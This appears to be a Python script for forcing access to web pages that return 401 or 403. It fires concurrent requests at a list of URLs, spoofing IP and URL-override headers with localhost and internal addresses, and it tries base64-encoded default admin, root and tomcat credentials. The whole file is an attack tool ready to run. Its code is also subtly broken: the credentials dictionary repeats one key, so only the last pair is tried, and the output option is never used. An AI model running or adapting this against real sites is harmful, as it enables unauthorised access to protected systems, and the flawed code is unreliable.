import argparse
import concurrent.futures
import random
import requests
from termcolor import colored as clr

# This tool is used to bypass pages that give 401/403 statuscode. This is done, by trying to connect to the page with a number of headers.

### BANNER
print("lol")

### PARSER
p = argparse.ArgumentParser()
p.add_argument(
        '-l',
        '--list',
        dest="list",
        required=True,
        help="Provide a list of urls to bypass."
        )
p.add_argument(
        '-v',
        '-verbose',
        dest="verb",
        default=False,
        action="store_true",
        help="Make the tool verbose, printing out results once a scan completes."
        )
p.add_argument(
        '-o',
        '--output',
        dest="output",
        default="bypassed.txt",
        help="Give an output for the results."
        )
p.add_argument(
        '-c',
        '--concurrency',
        dest="conc",
        default=10,
        help="The concurrent scans."
        )
args = p.parse_args()

### USER AGENTS
user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
        "Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36 Edg/99.0.1150.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 12.6; rv:105.0) Gecko/20100101 Firefox/105.0",
        "Mozilla/5.0 (X11; Linux i686; rv:105.0) Gecko/20100101 Firefox/105.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0",
        "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.34",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.34",
        "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko"
        ]

### PAYLOADS
payloads_headers = ["Access-Control-Allow-Origin" ,"Base-Url" ,"CF-Connecting_IP" ,"CF-Connecting-IP" ,"Client-IP" ,"Cluster-Client-IP" ,"Destination" ,"Forwarded-For-Ip" ,"Forwarded-For" ,"Forwarded-Host" ,"Forwarded" ,"Host" ,"Http-Url" ,"Http-Host" ,"Origin" ,"Profile" ,"Proxy-Host" ,"Proxy-Url" ,"Proxy" ,"Real-Ip" ,"Redirect" ,"Referer" ,"Referrer" ,"Request-Uri" ,"True-Client-IP" ,"Uri" ,"Url" ,"X-Arbitrary" ,"X-Client-IP" ,"X-Custom-IP-Authorization" ,"X-Forward-For" ,"X-Forward" ,"X-Forwarded-By" ,"X-Forwarded-For-Original" ,"X-Forwarded-For" ,"X-Forwarded-Host" ,"X-Forwarded-Proto" ,"X-Forwarded-Server" ,"X-Forwarded" ,"X-Forwarder-For" ,"X-Host" ,"X-HTTP-DestinationURL" ,"X-HTTP-Host-Override" ,"X-Original-Remote-Addr" ,"X-Original-URL" ,"X-Original-Host" ,"X-Originally-Forwarded-For" ,"X-Originating-IP" ,"X-Proxy-Url" ,"X-ProxyUser-Ip" ,"X-Real-Ip" ,"X-Real-IP" ,"X-Referrer" ,"X-Remote-Addr" ,"X-Remote-IP" ,"X-Rewrite-URL" ,"X-Request-URL" ,"X-True-IP" ,"X-WAP-Profile"]

payloads_ips = ["*","0","0.0.0.0","0177.0000.0000.0001","0177.1","0x7F000001","10.0.0.0","10.0.0.1","127.0.0.1","127.0.0.1:443","127.0.0.1:80","127.1","172.16.0.0","172.16.0.1","172.17.0.1","192.168.0.2","192.168.1.0","192.168.1.1","2130706433","8.8.8.8","localhost","localhost:443","localhost:80","norealhost","null"]
payloads_auth = {
        'Authorization':'Basic YWRtaW46YWRtaW4K',
        'Authorization':'Basic YWRtaW46YWRtaW5pc3RyYXRvcgo=',
        'Authorization':'Basic YWRtaW46cGFzc3dvcmQK',
        'Authorization':'Basic YWRtaW46cGFzc3dvcmQxMjMK',
        'Authorization':'Basic YWRtaW46UGFzc3dvcmQxMjMK',
        'Authorization':'Basic YWRtaW46UGFzc3dvcmQK',
        'Authorization':'Basic YWRtaW46MTIzNDU2NzgK',
        'Authorization':'Basic YWRtaW46cXdlcnR5Cg==',
        'Authorization':'Basic YWRtaW5pc3RyYXRvcjphZG1pbgo=',
        'Authorization':'Basic YWRtaW5pc3RyYXRvcjphZG1pbmlzdHJhdG9yCg==',
        'Authorization':'Basic YWRtaW5pc3RyYXRvcjpwYXNzd29yZAo=',
        'Authorization':'Basic YWRtaW5pc3RyYXRvcjpwYXNzd29yZDEyMwo=',
        'Authorization':'Basic YWRtaW5pc3RyYXRvcjpQYXNzd29yZDEyMwo=',
        'Authorization':'Basic YWRtaW5pc3RyYXRvcjpQYXNzd29yZAo=',
        'Authorization':'Basic YWRtaW5pc3RyYXRvcjoxMjM0NTY3OAo=',
        'Authorization':'Basic YWRtaW5pc3RyYXRvcjpxd2VydHkK',
        'Authorization':'Basic c3VwZXJhZG1pbjphZG1pbgo=',
        'Authorization':'Basic c3VwZXJhZG1pbjphZG1pbmlzdHJhdG9yCg==',
        'Authorization':'Basic c3VwZXJhZG1pbjpwYXNzd29yZAo=',
        'Authorization':'Basic c3VwZXJhZG1pbjpQYXNzd29yZAo=',
        'Authorization':'Basic c3VwZXJhZG1pbjpQYXNzd29yZDEyMwo=',
        'Authorization':'Basic c3VwZXJhZG1pbjpwYXNzd29yZDEyMwo=',
        'Authorization':'Basic c3VwZXJhZG1pbjoxMjM0NTY3OAo=',
        'Authorization':'Basic c3VwZXJhZG1pbjpxd2VydHkK',
        'Authorization':'Basic cm9vdDphZG1pbgo=',
        'Authorization':'Basic cm9vdDphZG1pbmlzdHJhdG9yCg==',
        'Authorization':'Basic cm9vdDpwYXNzd29yZAo=',
        'Authorization':'Basic cm9vdDpQYXNzd29yZAo=',
        'Authorization':'Basic cm9vdDpwYXNzd29yZDEyMwo=',
        'Authorization':'Basic cm9vdDpQYXNzd29yZDEyMwo=',
        'Authorization':'Basic cm9vdDoxMjM0NTY3OAo=',
        'Authorization':'Basic cm9vdDpxd2VydHkK',
        'Authorization':'Basic cm9vdDpyb290Cg==',
        'Authorization':'Basic cm9vdDp0b29yCg==',
        'Authorization':'Basic dG9tY2F0OmFkbWluCg==',
        'Authorization':'Basic dG9tY2F0OmFkbWluMTIzCg==',
        'Authorization':'Basic dG9tY2F0OmFkbWluaXN0cmF0b3IK',
        'Authorization':'Basic dG9tY2F0OnBhc3N3b3JkCg==',
        'Authorization':'Basic dG9tY2F0OlBhc3N3b3JkCg==',
        'Authorization':'Basic dG9tY2F0OlBhc3N3b3JkMTIzCg==',
        'Authorization':'Basic dG9tY2F0OnBhc3N3b3JkMTIzCg==',
        }

### SUB FUNCTIONS
def listfromfile(file):
    f = file
    with open(f) as l:
        createlist = [line.rstrip() for line in l]

    return createlist

def uagen():
    ua = f"{user_agents[random.randint(0,len(user_agents)-1)]}"
    return ua

def create_header(key,value):
    header = {
            'User-Agent':f"{uagen()}",
            'Accept-Encoding':'gzip, deflate, br',
            'Accept':'*/*',
            'Accept-Language':'en-US,en;q=0.5',
            f'{key}':f'{value}'
            }
    return header

### GLOBAL VARIABLES
urls = listfromfile(args.list) 

### MAIN FUNCTIONS
# Function for the main scan.
# Idea is to scan each url on their own and return the results.
# If the page returns status code 200, then we will append it to the result list.
def scan_url(u):
    # Position of the ip from the list of ips, to determine where the scan is currently
    pos = urls.index(u)

    print("[",clr("INFO!","light_grey"),"]",clr(f"{u}","light_cyan"),"bypassing forbidden pages",clr(f"({pos + 1}/{len(urls)})                                                      ","green"),end="\r")

    # Making a request to the url, with payloads
    for k in payloads_headers:
        for v in payloads_ips:
            try:
                r = requests.get(u, headers=create_header(k,v), allow_redirects=False, timeout=(5,5))
                r.close()
            except Exception as e:
                print("[",clr("ERROR","red"),"]","[",clr(k,"cyan"),"]",u,e,"                                                ")
            else:
                status = str(r.status_code)
                if status == "200":
                    print("[",clr(status,"green"),"]","[",clr(f"{k}:{v}","cyan"),"]",u,"                                                ")
                else:
                    if args.verb:
                        print("[",clr(status,"red"),"]","[",k,"]",u,"                                     ")
    # Doing the same with auth payloads
    for k,v in payloads_auth.items():
        try:
            r = requests.get(u, headers=create_header(k,v), allow_redirects=False, timeout=(5,5))
            r.close()
        except Exception as e:
            print("[",clr("ERROR","red"),"]","[",clr(k,"cyan"),"]",u,e,"                                                ")
        else:
            status = str(r.status_code)
            if status == "200":
                print("[",clr(status,"green"),"]","[",clr(f"{k}:{v}","cyan"),"]",u,"                                                ")
            else:
                if args.verb:
                    print("[",clr(status,"red"),"]","[",k,"]",u,"                                     ")


### SCRIPT
if __name__ == "__main__":
    # Change args.conc to int
    args.conc = int(args.conc)

    # Start the script
    with concurrent.futures.ProcessPoolExecutor(max_workers=args.conc) as exe:
       f1 = [exe.submit(scan_url,urls[x]) for x in range(len(urls))]

    # Print the finish 
    print("[",clr("COMPLETE!","light_yellow"),"]","scanning complete.                                                                      ")
